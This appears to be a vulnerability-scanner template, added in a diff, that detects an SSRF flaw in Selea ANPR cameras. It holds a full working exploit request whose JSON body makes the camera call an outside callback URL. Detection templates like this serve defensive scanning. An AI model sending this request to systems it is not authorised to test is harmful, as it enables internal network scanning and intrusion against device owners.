@@ -1,0 +1,27 @@
+id: selea-anpr-camera-ssrf
+info:
+  name: Selea ANPR Camera SSRF Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    ANPR Camera, developed by Selea, has a SSRF vulnerability. Attackers can exploit this to conduct network scans, local port scans, and attack internal applications.
+  tags: ssrf, camera
+http:
+  - raw:
+      - |
+        POST /cps/test_backup_server?ACTION=TEST_IP&NOCONTINUE=TRUE HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+        Content-Type: application/json
+
+        {"test_type":"ip","test_debug":false,"ipnotify_type":"http/get","ipnotify_address":"http://{{interactsh-url}}","ipnotify_username":"","ipnotify_password":"","ipnotify_port":"0","ipnotify_content_type":"","ipnotify_template":""}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
